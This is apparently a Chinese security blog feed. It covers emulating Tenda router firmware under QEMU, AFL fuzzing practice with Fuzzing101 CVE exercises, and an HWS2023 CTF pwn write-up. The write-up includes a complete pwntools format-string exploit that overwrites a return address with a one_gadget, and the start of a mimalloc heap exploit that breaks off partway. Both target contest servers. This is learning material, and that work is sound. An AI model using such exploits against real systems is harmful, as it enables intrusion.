class="hljs bash">sudo <span class="hljs-built_in">chroot</span> . ./qemu-arm-static ./bin/httpd<br></code></pre></td></tr></table></figure><p>执行了，但没完全执行，但至少我们可以确定这样是有可行性的（yes,we love linux!!!)</p><p><img src="/img/FW/0.png" alt="img"></p><p>把httpd拖进ida，根据相应得字符串，看一下是哪边卡住了</p><p>在那边下个断点，然后用IDA远程调式康康什么情况，GDB应该也行</p><p><img src="/img/FW/1.png" alt="img"></p><p>单步步进，看到R0寄存器被赋值0，随后就只能跳转到0x2E514，所以使用keypatch来绕过这个这个检测</p><p><img src="/img/FW/2.png" alt="img"></p><p><img src="/img/FW/3.png" alt="img"></p><p>再执行看看会怎么样</p><p>又寄了，那就再动调一下</p><p><img src="/img/FW/4.png" alt="img"></p><p>可有看到这边又有一个和刚才类似得patch，那就故技重施</p><p><img src="/img/FW/5.png" alt="img"></p><p><img src="/img/FW/6.png" alt="img"></p><p>再次执行，成功了，但没完全成功，255.255.255.255是给人访问的？那只能继续调了</p><p><img src="/img/FW/7.png" alt="img"></p><p>可以看到我们前面的两处patch都是为了执行<strong>ConnectCfm</strong>，接下来便是一些变量的获取</p><p>在<strong>GetLanIfName</strong>之后，猜测**GetValue(“lan.ip”, s);**便是导致ip不正常的罪魁祸首</p><p>那就查看一下外部调用<strong>GetLanIfName</strong></p><p><strong>GetLanIfName</strong>被定义在<strong>lib&#x2F;libcommon.so</strong>中，外部调用了<strong>get_eth_name</strong></p><p><img src="/img/FW/11.png" alt="img"></p><p>外部调用函数<strong>get_eth_name</strong>被定义<strong>lib&#x2F;libChipApi.so</strong>在中，具体function是获取网卡名称，但是本机中无法匹配与之相应的网卡</p><p><img src="/img/FW/8.png" alt="img"></p><p>所以那就起一个名称为<strong>br0</strong>的网卡</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> brctl addbr br0<br><span class="hljs-attribute">sudo</span> ifconfig br0 <span class="hljs-number">192.168.10.144</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><p>成功！！！</p><p><img src="/img/FW/9.png" alt="img"></p><p>访问一下ip试试</p><p>草，访问失败，香槟开早了</p><p><img src="/img/FW/12.png" alt="img"></p><p>那就只能在启动的时候加上<strong>–strace</strong>参数看看具体执行过程了</p><p>果然，在访问**&#x2F;webroot&#x2F;main.html**时发生了报错</p><p><img src="/img/FW/13.png" alt="img"></p><p>仔细一看webroot这个文件夹是空的，而那些main.html文件全在文件夹webroot_ro中</p><p><img src="/img/FW/14.png" alt="img"></p><p>那就只能把webroot给删了，然后创建一个软连接了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">rm</span> -rf webroot<br>sudo <span class="hljs-built_in">ln</span> -s webroot_ro/ webroot<br></code></pre></td></tr></table></figure><p>再访问一下，成功！！</p><p><img src="/img/FW/15.png" alt="img"></p><h3 id="hook"><a href="#hook" class="headerlink" title="hook"></a>hook</h3><p>这个手法太超前了，等铸币笔者学成归来再说</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h2 id="qemu-system"><a href="#qemu-system" class="headerlink" title="qemu system"></a>qemu system</h2><p>这时候就到了全系统模拟了</p><p>winmt👴的文章中有很详细的流程[<a href="https://bbs.kanxue.com/thread-272318.htm#msg_header_h2_4">原创] 从零开始复现 DIR-815 栈溢出漏洞-二进制漏洞-看雪-安全社区|安全招聘|kanxue.com</a></p><p>王指导用的是ubuntu20，但我只有ubuntu16能成功起起来</p><p>文章中那个镜像的链接好像有点小问题，笔者这边贴一个<a href="https://files.sboc.dev/images/">images (sboc.dev)</a>，里面还有system模式启动脚本，真的我哭死</p><p>这边还是用Tenda AC15的固件作为示范</p><p>镜像起起来后，保证qemu里的ip能和外网ping通。</p><p>本地开一个http服务或者用scp把squashfs-root传输进去</p><p>使用命令挂载并切换根目录</p><p><img src="/img/FW/16.png" alt="img"></p><p>接下来便是把patch好的httpd替换掉原本的</p><p>设置网卡了br0，但默认的busybox中不存在brctl指令，github上随便找个编译好的arm架构的busybox传进去就行</p><p>启动httpd</p><p><img src="/img/FW/17.png" alt="img"></p>]]></content>
    
    
    <categories>
      
      <category>Iot</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Iot</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dig into the afl</title>
    <link href="/2023/07/18/fuzz0/"/>
    <url>/2023/07/18/fuzz0/</url>
    
    <content type="html"><![CDATA[<h1 id="0x0-写在所有之前"><a href="#0x0-写在所有之前" class="headerlink" title="0x0:写在所有之前"></a>0x0:写在所有之前</h1><p>在笔者看来，fuzz无疑是一个天才的想法，通过自动化的大量的随机数据测试，进行漏洞挖掘。</p><p>笔者一直很想学习这一方面的知识，在粗略的拜读完<strong>Fuzzing: A Survey for Roadmap</strong>之后，恰好暑假也有点空闲时间（<del>主要是放了两礼拜假什么也没干有点良心不安</del>），便打算从afl入手来学习fuzz。</p><h1 id="0x1-初探"><a href="#0x1-初探" class="headerlink" title="0x1:初探"></a>0x1:初探</h1><p>下载安装什么的网上可以自己找捏wakuwaku</p><p>首先呢可以自己先随遍写一些测试用例</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span> </span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">test</span><span class="hljs-params">(<span class="hljs-type">char</span> *str)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> len = <span class="hljs-built_in">strlen</span>(str);<br>    <span class="hljs-keyword">if</span>(str[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;A&#x27;</span> &amp;&amp; len == <span class="hljs-number">6</span>)<br>    &#123;<br>        <span class="hljs-built_in">raise</span>(SIGSEGV);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(str[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;F&#x27;</span> &amp;&amp; len == <span class="hljs-number">66</span>)<br>    &#123;<br>        <span class="hljs-built_in">raise</span>(SIGSEGV);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(str[<span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;L&#x27;</span> &amp;&amp; len == <span class="hljs-number">666</span>)<br>    &#123;<br>        <span class="hljs-built_in">raise</span>(SIGSEGV);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot; OK ,it is safe&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv, <span class="hljs-type">char</span> *envp)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;welcome to korey0sh1&#x27;s AFL test!!&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;pls input your content: &quot;</span>);<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x100</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-built_in">gets</span>(buf);<br>    <span class="hljs-built_in">test</span>(buf);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>分别用gcc和afl-gcc编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc ./test.c -o <span class="hljs-built_in">test</span><br>/path/to/afl-gcc ./test.c -o afl_test<br></code></pre></td></tr></table></figure><p>然后用ida打开看看这两个elf文件有什么不同</p><p><img src="/img/Fuzz0/0.png" alt="img"></p><p>可以看到afl_test里面出现了许多奇怪的东西，这其实就是afl-gcc在编译时对测试源码进行了插桩（主要是**__afl_maby_log**函数）</p><p>这些被插入的桩总的来讲类似于传感器，实现对branch、edge（分支、边缘）覆盖率的捕获和分支点的统计，在后续的fuzz测试中会根据这些反馈信息进行新的路径探索和测试。（其实铸币笔者也刚刚在看afl源码，又回到了被源码支配的日子了呜呜呜）</p><p>接下来可以试着来真正fuzz一下这个test</p><p>先搞两个空文件夹存放输入样例和输出样例，fuzz_in里面touch 一个testcase随便写点什么。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> fuzz_in<br><span class="hljs-built_in">mkdir</span> fuzz_out<br><br>/path/to/afl-fuzz -i fuzz_in/ -o fuzz_out/ ./afl_test<br></code></pre></td></tr></table></figure><p>第一次尝试可能会报错需要设置一下core_pattern</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">su root<br>echo &gt; <span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>core_pattern<br></code></pre></td></tr></table></figure><p>然后就可以愉快的afl_fuzz啦</p><p>进去后可以看到这样一个界面，相信大家英文都比我好，各种参数的含义korey看得懂得各位看官老爷也一定看懂嘻嘻。</p><p><img src="/img/Fuzz0/1.png" alt="img"></p><p>由于铸币笔者只能用垃圾笔记本跑（乐色13900h），所以跑了大概一个小时跑出来了8个crash</p><p>接下来便是进到fuzz_out中看看每个crash是什么样的</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css">用：<br>xxd <span class="hljs-selector-attr">[the name of crash]</span><br>可以查看触发crash的输入<br></code></pre></td></tr></table></figure><p><img src="/img/Fuzz0/2.png" alt="img"></p><p>crash0满足了buf[0] &#x3D; ‘A’且len &#x3D; 6</p><p>crash1满足了buf[1] &#x3D; ‘F’且len &#x3D; 66</p><p>crash2因为gets函数造成了栈溢出</p><p>遗憾的是buf[2] &#x3D; ‘L’且len &#x3D; 666的crash并未触发</p><p>之后便可以使用gdb将test文件和crash样例组合调试</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">gdb ./test<br><span class="hljs-built_in">run</span> &lt; [the name of crash]<br></code></pre></td></tr></table></figure><p><img src="/img/Fuzz0/3.png" alt="img"></p><p>用bt回溯可以看到stack smashing，造成栈溢出了</p><h1 id="0x2-Fuzzing-101"><a href="#0x2-Fuzzing-101" class="headerlink" title="0x2:Fuzzing 101"></a>0x2:Fuzzing 101</h1><p>这是个github上的<a href="https://github.com/antonio-morales/Fuzzing101">项目</a>，专门来帮助那些想要把fuzz应用于实战的带手子们。</p><p>项目中有十分详细的步骤，笔者就不在此赘述。笔者仅在此记录一些收获</p><h2 id="exercise-1-Xpdf"><a href="#exercise-1-Xpdf" class="headerlink" title="exercise 1:Xpdf"></a>exercise 1:Xpdf</h2><p>第一个example是 <a href="https://www.cvedetails.com/cve/CVE-2019-13288/">CVE-2019-13288</a></p><p>在version 4.01.01的xpdf中，Parser.cc中的Parser::getObj()函数将会被无限调用导致内存耗尽，最终使程序崩溃，达到DoS攻击的效果。</p><p>感觉afl++比afl好用点</p><p>【-M】：主fuzzer，配合【-S】多开从属fuzzer效率可以提高</p><p>当输入为文件时，需要使用【@@】，否则为标准输入</p><p>插桩完后恢复成正常的gcc编译</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">CFLAGS</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;-g -O0&quot;</span> CXXFLAGS<span class="hljs-operator">=</span><span class="hljs-string">&quot;-g -O0&quot;</span><br></code></pre></td></tr></table></figure><h2 id="exercise-2-libexif"><a href="#exercise-2-libexif" class="headerlink" title="exercise 2:libexif"></a>exercise 2:libexif</h2><p>在version 0.6.14 的libexif中，存在heap buffer overflow <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3895">CVE-2009-3895</a>以及out-of-bounds read<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-2836">CVE-2012-2836</a></p><p>这边插桩时使用的是<strong>afl-clang-lto</strong></p><p>但libexif只是一个解析、保存、编辑exif数据的库，所以还要有相应的可执行文件（exif，编译的时候制定一下链接库文件夹）才能正常实现功能</p><p>就最后的调试而言，项目中使用的eclipse，具有图形化界面，笔者还是GDB用的习惯，直接</p><p><strong>gdb –args</strong> 指定参数就行了</p><p><img src="/img/Fuzz0/4.png" alt="img"></p><h2 id="exercise-3-tcpdump"><a href="#exercise-3-tcpdump" class="headerlink" title="exercise 3:tcpdump"></a>exercise 3:tcpdump</h2><p>目前为止最折磨的一集</p><p>在version 4.9.2的 Tcpdump中，BOOTP协议数据包可以触发out-of-bouds Read，其实也算是overflow的一种 <a href="https://www.cvedetails.com/cve/CVE-2017-13028/">CVE-2017-13028</a></p><p>这次采用速度更快的afl-clang-lto（但nmd还是fuzz了10个小时才出来8个crash，不过一看hollk师傅的博客，用afl-clang-fast15个小时出一个crash，心里突然平衡了一点）</p><p>且在编译tcpdump和所对应的动态链接库时，加入了ASAN选项</p><p><strong>ASAN（Address Sanitizer）是针对 C&#x2F;C++ 的快速内存错误检测工具，在运行时检测 C&#x2F;C++ 代码中的多种内存错误</strong></p><p>铸币笔者也不是很懂，附带一个官方说明书<a href="https://clang.llvm.org/docs/AddressSanitizer.html">AddressSanitizer — Clang 18.0.0git documentation (llvm.org)</a></p><p>后面执行运行tcpdump就能直接看到报错，感觉还是挺方便的，就是ASAN运行时所需内存有点大，fuzz的时候要加上 <strong>-m none</strong> 的参数解除内存限制</p><p>贴个图意思一下</p><p><img src="/img/Fuzz0/6.png" alt="img"></p><p><img src="/img/Fuzz0/7.png" alt="img"></p><h2 id="exercise-4-LibTiff"><a href="#exercise-4-LibTiff" class="headerlink" title="exercise 4:LibTiff"></a>exercise 4:LibTiff</h2><p>逐渐熟练，笑</p><p>前面还是用ASAN和AFL++进行一个fuzz操作</p><p>在此次exercise中，项目作者用到了<strong>lcov</strong>，一个基于<strong>GCC</strong>代码覆盖测试工具<strong>gcov</strong>的图形前端</p><p>在编译的时候</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">CFLAGS</span>=<span class="hljs-string">&quot;--coverage&quot;</span> <span class="hljs-attribute">LDFLAGS</span>=<span class="hljs-string">&quot;--coverage&quot;</span> <br></code></pre></td></tr></table></figure><p>编译完成后，进入tiff文件夹</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-comment"># 重置计数器</span><br>lcov <span class="hljs-params">--zerocounters</span> <span class="hljs-params">--directory</span> <span class="hljs-string">./</span><br><span class="hljs-comment"># 返回包含每个插桩代码行零覆盖率的基于行的覆盖率数据文件</span><br>lcov <span class="hljs-params">--capture</span> <span class="hljs-params">--initial</span> <span class="hljs-params">--directory</span> <span class="hljs-string">./</span> <span class="hljs-params">--output-file</span> app.info<br><span class="hljs-comment"># 运行程序</span><br>$HOME/fuzzing_tiff/install/bin/tiffinfo -D -j -c -r -s -w $HOME/fuzzing_tiff/tiff-4.0.4/test/images/palette-1c-1b.tiff<br><span class="hljs-comment"># 将当前状态覆盖状态保存到【app2.info】文件中</span><br>lcov <span class="hljs-params">--no-checksum</span> <span class="hljs-params">--directory</span> <span class="hljs-string">./</span> <span class="hljs-params">--capture</span> <span class="hljs-params">--output-file</span> app2.info<br></code></pre></td></tr></table></figure><p>笔者这边把前10个crash试了试，感觉代码覆盖率不是很理想</p><p><img src="/img/Fuzz0/8.png" alt="img"></p><h2 id="exercise-5-LibXml2"><a href="#exercise-5-LibXml2" class="headerlink" title="exercise 5:LibXml2"></a>exercise 5:LibXml2</h2><p>难绷，crash出不来就出不来吧</p><p><img src="/img/Fuzz0/9.png" alt="img"></p><p>第一次完全没有看项目里的solution，自己解决，编译的时候看缺了个Python.h的头文件还自己编译了一个python（笑哭），好在最后成功跑起来了。</p><p>【 <strong>-x</strong> 】：指定字典</p><p>【 <strong>-D</strong> 】: 确定性突变</p><p>ASAN真好用，嘿嘿嘿嘿</p><h2 id="exercise-6-GIMP"><a href="#exercise-6-GIMP" class="headerlink" title="exercise 6:GIMP"></a>exercise 6:GIMP</h2><p>寄，我也不知道为什么fuzz101提供的demo会直接crash，怎么直接会有memory leak啊</p><p><img src="/img/Fuzz0/10.png" alt="img"></p><p>试了好几个xcf文件都是这样</p><h2 id="exercise-7-VLC"><a href="#exercise-7-VLC" class="headerlink" title="exercise 7: VLC"></a>exercise 7: VLC</h2><p>更抽象的一集</p><h2 id="exercise-8-Adobe-Reader"><a href="#exercise-8-Adobe-Reader" class="headerlink" title="exercise 8: Adobe Reader"></a>exercise 8: Adobe Reader</h2><p>无源码直接fuzzelf文件</p>]]></content>
    
    
    <categories>
      
      <category>Fuzz</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fuzz</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HWS2023</title>
    <link href="/2023/07/17/HWS2023/"/>
    <url>/2023/07/17/HWS2023/</url>
    
    <content type="html"><![CDATA[<h1 id="0x0-写在所有之前"><a href="#0x0-写在所有之前" class="headerlink" title="0x0:写在所有之前"></a>0x0:写在所有之前</h1><p>很难评价这次的HWS，还以为会有固件、Iot和kernel，白准备了。</p><p>Misc和Crypto真的pwn手坐大牢，只能各挑软柿子捏了。</p><h1 id="0x1-The-WriteUp-of-Pwn"><a href="#0x1-The-WriteUp-of-Pwn" class="headerlink" title="0x1:The WriteUp of Pwn"></a>0x1:The WriteUp of Pwn</h1><h2 id="fmt"><a href="#fmt" class="headerlink" title="fmt"></a>fmt</h2><p>最标准的栈上格式化字符串</p><p>泄露出栈地址和libc基址后改ret_addr为ogg一把梭就好了</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs css"># -*- coding: UTF-<span class="hljs-number">8</span> -*-<br>from pwn import *<br>import sys<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>libc = <span class="hljs-built_in">ELF</span>(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>flag=<span class="hljs-number">1</span><br>if flag:<br>    p = <span class="hljs-built_in">remote</span>(<span class="hljs-string">&#x27;60.204.140.184&#x27;</span>, <span class="hljs-number">30030</span>)<br>else:<br>    p = <span class="hljs-built_in">process</span>(<span class="hljs-string">&#x27;./fmt&#x27;</span>)<br>sa = lambda s,n : p.<span class="hljs-built_in">sendafter</span>(s,n)<br>sla = lambda s,n : p.<span class="hljs-built_in">sendlineafter</span>(s,n)<br>sl = lambda s : p.<span class="hljs-built_in">sendline</span>(s)<br>sd = lambda s : p.<span class="hljs-built_in">send</span>(s)<br>rc = lambda n : p.<span class="hljs-built_in">recv</span>(n)<br>ru = lambda s : p.<span class="hljs-built_in">recvuntil</span>(s)<br>ti = lambda : p.<span class="hljs-built_in">interactive</span>()<br>leak = lambda name,addr :log.<span class="hljs-built_in">success</span>(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br><br>payload = b<span class="hljs-string">&#x27;%10$p%18$p%19$p&#x27;</span><br><span class="hljs-built_in">sla</span>(b<span class="hljs-string">&#x27;: &#x27;</span>,payload)<br><br><span class="hljs-built_in">ru</span>(b<span class="hljs-string">&#x27;0x&#x27;</span>)<br>libc.address = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">rc</span>(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stderr_&#x27;</span>]<br><span class="hljs-built_in">ru</span>(b<span class="hljs-string">&#x27;0x&#x27;</span>)<br>stack_addr = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">rc</span>(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">0</span>x10<br><span class="hljs-built_in">ru</span>(b<span class="hljs-string">&#x27;0x&#x27;</span>)<br>code_base = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">rc</span>(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">0</span>x13e2<br><span class="hljs-built_in">leak</span>(<span class="hljs-string">&quot;libc.address&quot;</span>,libc.address)<br><span class="hljs-built_in">leak</span>(<span class="hljs-string">&quot;stack&quot;</span>,stack_addr)<br><span class="hljs-built_in">leak</span>(<span class="hljs-string">&quot;code_base&quot;</span>,code_base)<br><br>gadget = [<span class="hljs-number">0</span>xe3afe,<span class="hljs-number">0</span>xe3b01,<span class="hljs-number">0</span>xe3b04]<br>one_gadget = libc.address + gadget[<span class="hljs-number">1</span>]<br>target = stack_addr +<span class="hljs-number">0</span>x18<br>low = one_gadget &amp; <span class="hljs-number">0</span>xffff<br>high = (one_gadget &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0</span>xffff<br><br><br>payload = b<span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(low).<span class="hljs-built_in">encode</span>( )+ b<span class="hljs-string">&#x27;c%10$hn&#x27;</span><br>payload += b<span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(high-low).<span class="hljs-built_in">encode</span>() + b<span class="hljs-string">&#x27;c%11$hn&#x27;</span><br>payload = payload.<span class="hljs-built_in">ljust</span>(<span class="hljs-number">0</span>x20,b<span class="hljs-string">&#x27;a&#x27;</span>)<br>payload += <span class="hljs-built_in">p64</span>(target) + <span class="hljs-built_in">p64</span>(target+<span class="hljs-number">2</span>)<br><br><span class="hljs-built_in">sla</span>(b<span class="hljs-string">&#x27;: &#x27;</span>,payload)<br><span class="hljs-built_in">leak</span>(<span class="hljs-string">&quot;onegadget&quot;</span>,one_gadget)<br><span class="hljs-built_in">leak</span>(<span class="hljs-string">&quot;low&quot;</span>,low)<br><span class="hljs-built_in">leak</span>(<span class="hljs-string">&quot;high&quot;</span>,high)<br>p.<span class="hljs-built_in">interactive</span>()<br></code></pre></td></tr></table></figure><h2 id="mi"><a href="#mi" class="headerlink" title="mi"></a>mi</h2><p>第一次做mi_malloc的题，刚开始在ubuntu20里找不到libmimalloc2.0的安装包，后来问了xtx师傅直接用patchelf中的”–add-needed”选项直接把libmimalloc.so和libpthread.so给patch进去就好了。</p><p>因为有free后指针未置0，且mimalloc用来分配heap的头部可以泄露出libmimalloc的基地址，libmimalloc的基地址与libc的偏移固定，因此可以得到libc。</p><p>通过观察mi_malloc函数，发现存在deferred_free这个类似malloc_hook的函数，且位于deferred_free-0x8处的deferred_arg为可控的rdx，于是可以直接setcontext进行orw，堆栈结合太麻烦了。</p><p><img src="/img/HWS2023/0.png" alt="img"></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><code class="hljs vim">import lib2to3.pgen2.tokenize<br><br>from pwn import *<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>libmimalloc = ELF(<span class="hljs-string">&quot;./libmimalloc.so.2&quot;</span>)<br><br><span class="hljs-keyword">p</span> = remote(<span class="hljs-string">&quot;123.60.179.52&quot;</span>,<span class="hljs-number">30208</span>)<br><span class="hljs-keyword">sa</span> = lambda s,n : <span class="hljs-keyword">p</span>.sendafter(s,n)<br><span class="hljs-keyword">sla</span> = lambda s,n : <span class="hljs-keyword">p</span>.sendlineafter(s,n)<br><span class="hljs-keyword">sl</span> = lambda s : <span class="hljs-keyword">p</span>.sendline(s)<br>sd = lambda s : <span class="hljs-keyword">p</span>.send(s)<br>rc = lambda n : <span class="hljs-keyword">p</span>.recv(n)<br><span class="hljs-keyword">ru</span> = lambda s : <span class="hljs-keyword">p</span>.recvuntil(s)<br>ti = lambda : <span class="hljs-keyword">p</span>.interactive()<br>leak = lambda name,addr :<span class="hljs-built_in">log</span>.success(name+<span 